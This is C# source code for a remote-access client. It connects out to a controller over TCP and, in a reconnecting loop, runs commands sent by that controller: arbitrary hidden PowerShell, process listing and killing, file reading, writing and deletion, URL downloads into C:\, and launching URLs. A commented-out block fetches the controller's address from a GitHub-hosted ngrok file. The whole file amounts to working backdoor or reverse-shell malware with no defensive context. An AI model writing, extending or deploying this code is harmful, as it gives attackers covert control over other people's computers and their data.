
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

namespace clin;

internal class Pro
{
   
    static string direct_work = "C:\\";
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

    [StructLayout(LayoutKind.Sequential)]
    public struct RECT
    {
        public int Left;
        public int Top;
        public int Right;
        public int Bottom;
    }

    private static void Main()
    {
       
    A:


            string host = "127.0.0.1";
            int port = 25565;
        try {
            
            bool IsDirectoryEmpty(string path)
        {
            return !Directory.EnumerateFileSystemEntries(path).Any();
        }
        string ClientCommannds(string command, Stream stream)
            {
            Process[] allProcesses= new Process[0];
                string[] helper = new string[] {"cmd$ --command","kill$ --pid","ps","nano$ --path$ --text", "open$ --path", "cat$ --path", "help", "username", "googleopen$ --Uri", "googledownload$ --Uri$ --path", "clear", "cd$ --path", "cd..", "ls", "showcd", "l", "mkdir$ --path", "rmdir$ --path" };
                string requst = "null";
                string strCmdText = "null";
                string[] parse_comamnd = command.Split("$");
                command = parse_comamnd[0];
                command = command.ToLower().Trim();
                string select_dir = "empty";
                string select_file = "empty.txt";
                int select_pid = 0;
                switch (command)
                {
                    
                    case "cmd":
                      
                        if (parse_comamnd.Length > 1)
                        {

                            strCmdText = parse_comamnd[1];
                            if (strCmdText.Trim().Length > 0)
                            {
                                Process process = Process.Start(new ProcessStartInfo
                                {
                                    FileName = "powershell",
                                    Arguments = "/command chcp 65001 & "+strCmdText,
                                    UseShellExecute = true,
                                    CreateNoWindow = true,
                                    RedirectStandardOutput = true

                                });
                                requst = process.StandardOutput.ReadToEnd();
                            }
                            else 
                            {
                                requst = "command == null";
                            }
                        }
                        else 
                        {
                            requst = "argument 1?";
                        }

                        
                        break;
                    case"kill":
                    if (parse_comamnd.Length>1) 
                    {
                        allProcesses = Process.GetProcesses();
                        if (int.TryParse(parse_comamnd[1], out select_pid))
                        {
                            foreach (var index in allProcesses) 
                            {
                                if (index.Id == select_pid)
                                {
                                    index.Kill();
                                    requst = "process kill";
                                }
                                else 
                                {
                                    requst = "process not found";
                                }
                            }
                        }
                        else 
                        {
                            requst = "this is pid not corect";
                        }
                    }
                    break;
                    case"ps":
                    string temp_process="";
                    allProcesses = Process.GetProcesses();
                    foreach (var index in allProcesses) 
                    {
                        temp_process += $"| Id - {index.Id}, PNaem - {index.ProcessName}, BPriority - {index.BasePriority}, Title - {index.MainWindowTitle}|\n";
                    }
                    requst = temp_process;
                    break;
                    case "": requst = "empty"; break;
                    case "help":
                        {
                            requst = "";
                            string[] array = helper;
                            foreach (string i in array)
                            {
                                requst = requst + "command - " + i + "\n";
                            }
                            break;
                        }
                    case "username":
                        requst = Environment.MachineName;
                        break;
                    case "googledownload":
                    using (WebClient client = new WebClient()) 
                    {
                        string answer3 = "empty";
                        if (parse_comamnd.Length > 1)
                        {
                            answer3 = parse_comamnd[1];
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                        if (parse_comamnd.Length > 2) {
                            if (Uri.TryCreate(answer3, UriKind.Absolute, out Uri uri))
                            {
                                client.DownloadFile(answer3, direct_work + parse_comamnd[2].Trim());
                                requst = "success";
                            }
                            else
                            {

                                requst = $"not correct Uri";
                            }
                        }
                        else 
                        {
                            requst = "argument 2?";
                        }
                    }
                        break;
                    case "googleopen":
                        {
                            string answer2 = "empty";
                            if (parse_comamnd.Length > 1)
                            {
                                answer2 = parse_comamnd[1];
                            }
                            else
                            {
                                requst = "argument 1?";
                            }


                            if (Uri.TryCreate(answer2, UriKind.Absolute, out Uri uri))
                            {
                                ProcessStartInfo psInfo = new ProcessStartInfo
                                {
                                    FileName = answer2.Trim(),
                                    UseShellExecute = true
                                };
                                Process.Start(psInfo);
                                requst = "success";
                            }
                            else
                            {

                                requst = $"|{answer2}|";
                            }


                            break;
                        }
                    case "l":
                        string temp_dir3 = "| File: ";
                        string[] files2 = Directory.GetFiles(direct_work);
                        foreach (string j in files2)
                        {
                            temp_dir3 = temp_dir3 + "# " + j + " #";
                        }
                        temp_dir3 += "\n";
                        temp_dir3 += "| Direst: ";
                        string[] directories2 = Directory.GetDirectories(direct_work);
                        foreach (string k in directories2)
                        {
                            temp_dir3 = temp_dir3 + "| " + k + " |";
                        }
                        temp_dir3 += "\n";
                        requst = temp_dir3;
                        break;
                    case "cd":

                        if (parse_comamnd.Length > 1)
                        {
                            select_dir = parse_comamnd[1];
                        }

                        if (Directory.Exists(direct_work + select_dir))
                        {
                            requst = "open dir";
                            direct_work += select_dir+"\\";
                        }
                        else
                        {
                            requst = "not dir";
                        }
                        if (Directory.Exists(select_dir))
                        {
                            direct_work = select_dir + "\\";
                            requst = "open dir";
                        }

                        break;
                    case "ls":
                        {
                            string temp_dir = "# File: ";
                            string[] files = Directory.GetFiles(direct_work);
                            foreach (string j in files)
                            {
                                temp_dir = temp_dir + "# " + j.Split("\\")[j.Split("\\").Length - 1] + " #";
                            }
                            temp_dir += "\n";
                            temp_dir += "| Direst: ";
                            string[] directories = Directory.GetDirectories(direct_work);
                            foreach (string k in directories)
                            {
                                temp_dir = temp_dir + "| " + k.Split("\\")[k.Split("\\").Length - 1] + " |";
                            }
                            temp_dir += "\n";
                            requst = temp_dir;
                            break;
                        }
                    case "cd..":
                        string temp_dir2 = "";
                        string[] parse_sh = direct_work.Split("\\");
                    if (direct_work!="C:\\") {
                        if (parse_sh.Length > 0)
                        {
                            for (int i = 0; i < parse_sh.Length - 2; i++)
                            {
                                if (i < parse_sh.Length) {
                                    temp_dir2 += $"{parse_sh[i]}\\";
                                }
                            }
                            direct_work = temp_dir2;
                            requst = temp_dir2;
                        }
                    }
                        break;
                    case "showcd":
                        requst = direct_work;
                        break;
                    case "test":
                        requst = "test";
                        break;
                    case "mkdir":
                        if (parse_comamnd.Length > 1)
                        {
                            select_dir = parse_comamnd[1];
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                    if (!Directory.Exists(direct_work + select_dir))
                    {
                        if (select_dir.Trim().Length > 0)
                        {
                            Directory.CreateDirectory($"{direct_work}{select_dir.Trim()}\\").Create();
                            requst = "direct created";
                        }
                        else 
                        {
                            requst = "direct empty";
                        }
                    }
                        break;
                    case "rmdir":
                        if (parse_comamnd.Length > 1)
                        {
                            select_dir = parse_comamnd[1];
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                    if (Directory.Exists(direct_work+select_dir)) {
                        if (select_dir.Trim().Length > 0) {
                            if (IsDirectoryEmpty(direct_work + select_dir.Trim() + "\\"))
                            {
                                Directory.Delete($"{direct_work}{select_dir.Trim()}\\"); 
                                requst = "direct remove";
                            }
                            else 
                            {
                                requst = "the folder is not empty";
                            }
                           
                        }
                    }
                        break;
                    case "open":
                        if (parse_comamnd.Length > 1)
                        {
                            select_file = parse_comamnd[1].Trim();
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                        if (File.Exists(direct_work + select_file))
                        {
                            requst = "open file";
                            Process.Start("notepad.exe", direct_work + select_file);
                        }
                        else
                        {
                            requst = "file not exists";
                        }
                        break;
                    case "cat":
                        if (parse_comamnd.Length > 0)
                        {
                            select_file = parse_comamnd[1].Trim();
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                        if (File.Exists(direct_work + select_file))
                        {
                            string file = File.ReadAllText(direct_work + select_file);
                            if (file?.Trim().Length > 0 && file != null)
                            {
                                requst = $"\n############################\n{file}\n############################\n";
                            }
                            else
                            {
                                requst = "file empty";
                            }
                        }
                        break;
                    case "nano":
                        if (parse_comamnd.Length > 1)
                        {
                            select_file = parse_comamnd[1].Trim();
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                        
                        if (parse_comamnd.Length > 2)
                        {
                        if (File.Exists(direct_work + select_file))
                        {
                            File.WriteAllText(direct_work + select_file, parse_comamnd[2].Trim());
                            requst = "save text";
                        }
                        else 
                        {
                          
                            if (Directory.Exists(direct_work)) {

                                if (select_file.Trim().Length > 0) {
                                    File.Create(direct_work + select_file).Close();

                                    File.WriteAllText(direct_work + select_file, parse_comamnd[2].Trim());
                                }
                            }
                            requst = "save text";
                        }
                        }
                        else
                        {
                            requst = "argument 2?";
                        }
                        break;
                    case "rm":
                        if (parse_comamnd.Length > 1)
                        {
                            select_file = parse_comamnd[1].Trim();
                        }
                    if (File.Exists(direct_work + select_file))
                    {
                        if (select_file.Trim().Length > 0) {
                            File.Delete(direct_work + select_file);
                            requst = "remove text";
                        }
                    }

                    break;
                    default:
                        requst = "Client: the command was not found"; break;


                }
                return requst;
            }
            string Read(Stream stream)
            {
                string requst = "nullread";
                byte[] buffer = new byte[1024];
                int size = stream.Read(buffer, 0, buffer.Length);
                requst = Encoding.UTF8.GetString(buffer, 0, size);
                return requst;
            }
            void Write(Stream stream, string text)
            {
                byte[] buffer = Encoding.UTF8.GetBytes(text);
                stream.Write(buffer, 0, buffer.Length);
                stream.Flush();
            }
           /* using (WebClient client = new WebClient())
            {
                string file = client.DownloadString("https://raw.githubusercontent.com/pag6666/ngrok_file/main/ngrok_server_connection");
                string[] arr = file.Split(':');
                host = arr[0];
                port = int.Parse(arr[1]);

            }*/
            Console.WriteLine($"host = {host} port = {port}");
            using (TcpClient client = new TcpClient(host, port))
            {
                using Stream stream = client.GetStream();
                while (true)
                {
                    string order = Read(stream);
                    Console.WriteLine(order);
                    string answer = "null answer";
                    if (order.Trim().Length > 0 && order != null)
                    {
                        answer = ClientCommannds(order, stream);
                    }
                    Write(stream, answer);
                }
            }

            }
        catch(Exception e)
        {
            Console.WriteLine(e.Message);
            Thread.Sleep(5000);
            goto A;
        }

        }
}
